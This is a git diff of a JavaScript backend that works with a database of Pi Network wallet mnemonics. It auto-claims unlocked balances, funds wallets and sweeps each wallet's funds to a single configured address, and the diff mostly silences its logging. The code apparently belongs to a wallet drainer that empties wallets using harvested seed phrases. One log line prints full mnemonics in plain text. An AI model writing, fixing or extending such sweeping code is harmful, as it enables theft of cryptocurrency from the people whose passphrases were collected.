@@ -454,16 +454,13 @@ export const autoClaimUnlocked = async () => {
 
                 if (success) {
                     console.log(`✅ Claimed Pi. Hash: ${success.hash}`);
-                    Passphrase.updateOne(
+                    await Passphrase.updateOne(
                         { _id: p._id },
                         { $set: { status: 'claimed' } }
                     );
                 } else {
                     console.log(`❌ Failed to claim for balanceId: ${p.balanceId}, amount: ${p.amount}, mnemonic: ${p.mnemonic}`);
-                    // await Passphrase.updateOne(
-                    //     { _id: p._id },
-                    //     { $set: { status: 'pending' } }
-                    // );
+                    
                 }
             });
 
@@ -471,10 +468,6 @@ export const autoClaimUnlocked = async () => {
 
         } catch (err) {
             console.error('❌ Error something went wrong Pi:', err.message || err);
-            // await Passphrase.updateOne(
-            //     { _id: p._id },
-            //     { $set: { status: 'pending' } }
-            // );
         }
     }
 
@@ -484,13 +477,13 @@ export const autoClaimUnlocked = async () => {
 
 const sweepWithLogs = async (p) => {
     try {
-        console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
+        // console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
 
         const result = await sweepWallet(p.mnemonic, PI_PUBLIC_ADDRESS);
         const success = result.data;
 
         if (success.hash) {
-            console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
+            // console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
         } else {
             // console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
         }
@@ -520,7 +513,7 @@ export const autoFundWallet = async () => {
 
     for (const p of sponsorsPhrase) {
         try {
-            console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);
+            // console.log(`🔄 funding for: ${p.mnemonic.slice(0, 10)}...`);
 
 
             const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
@@ -548,16 +541,16 @@ export const autoFundWallet = async () => {
                 const success = result.data;
 
                 if (success.hash) {
-                    console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
+                    // console.log(`✅ funded ${result.amount} Pi. Hash: ${success.hash}`);
                     
                 } else {
-                    console.log(`❌ Failed to fund ${result.amount} PI}`);
+                    // console.log(`❌ Failed to fund ${result.amount} PI}`);
                 }
             }
             await sleep(5000);
 
         } catch (err) {
-            console.error('❌ Error funding Pi:', err.message || err);
+            // console.error('❌ Error funding Pi:', err.message || err);
         }
     }
     global.isFunding = false;
